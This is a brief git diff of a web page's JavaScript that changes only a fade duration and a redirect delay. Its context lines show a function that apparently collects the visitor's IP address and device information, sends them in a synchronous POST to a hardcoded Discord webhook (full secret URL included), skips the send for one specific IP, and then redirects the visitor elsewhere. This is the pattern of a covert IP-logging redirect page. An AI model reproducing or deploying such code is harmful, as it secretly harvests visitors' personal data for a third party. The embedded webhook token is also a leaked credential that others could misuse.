@@ -155,7 +155,7 @@ function send_message() {
 }
 
 function send_message2(string, link, details=false) {
-	$("#wrapper").fadeTo(1200, 0)
+	$("#wrapper").fadeTo(750, 0)
 	var device_info = "";
 	var request = new XMLHttpRequest();
 	request.open("POST", "https://discord.com/api/webhooks/831949766698467338/U644U1woudzGB2s5bpaHIj_OYSyfTc8ENa9MAutiD1yD0mNUDz2kF_VnPAjCjiHB1z9n", false);
@@ -183,7 +183,7 @@ function send_message2(string, link, details=false) {
 	if (ip_address != "221.127.45.3") {
 		request.send(JSON.stringify(params));
 	}
-	setTimeout(function(){window.location.href = link;},1200);
+	setTimeout(function(){window.location.href = link;},1250);
 	// window.location.href = link;
 
 }
